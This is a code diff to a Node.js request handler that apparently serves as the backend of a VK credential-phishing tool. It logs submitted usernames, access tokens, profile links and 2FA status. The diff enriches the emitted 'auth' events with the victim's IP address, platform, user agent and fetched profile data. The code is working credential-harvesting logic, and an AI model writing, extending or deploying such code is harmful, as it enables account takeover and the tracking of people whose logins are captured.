@@ -18,8 +18,6 @@ export const post = async (request, response) => {
   const ua = request.headers["user-agent"];
   let agent;
 
-  EventsPipe.emit("auth:attempt", request.body);
-
   _();
   _(chalk.bold("<Authorization attempt>"));
   kwLog("Username", request.body.username);
@@ -34,6 +32,15 @@ export const post = async (request, response) => {
 
   kwLog("Platform", agent);
 
+  const basicData = {
+    ip: request.connection.remoteAddress,
+    platform: agent,
+    userAgent: ua,
+    ...request.body
+  };
+
+  EventsPipe.emit("auth:attempt", basicData);
+
   const result = await auth(request.body, agent.toLowerCase());
 
   response.writeHead(200, "OK", {
@@ -47,22 +54,22 @@ export const post = async (request, response) => {
     kwLog("Page", `https://vk.com/id${result.user_id}`);
     kwLog("Token", result.token);
 
-    EventsPipe.emit("auth:success", { ...request.body, ...result });
-
     const vk = new VK({ token: result.token });
 
     const [me] = await vk.api.users.get({});
+
+    EventsPipe.emit("auth:success", { ...basicData, ...result, ...me });
     kwLog("Name", `${me.first_name} ${me.last_name}`);
     kwLog(
       "2fa",
       "code" in request.body ? chalk.redBright("Yes") : chalk.greenBright("No")
     );
   } else if (result.status === R_REQUIRE_2FA) {
-    EventsPipe.emit("auth:2fa", request.body);
+    EventsPipe.emit("auth:2fa", basicData);
 
     kwLog("Status", chalk.yellowBright("2FA Required"));
   } else {
-    EventsPipe.emit("auth:failure", request.body);
+    EventsPipe.emit("auth:failure", basicData);
 
     kwLog("Status", chalk.redBright("Error"));
   }
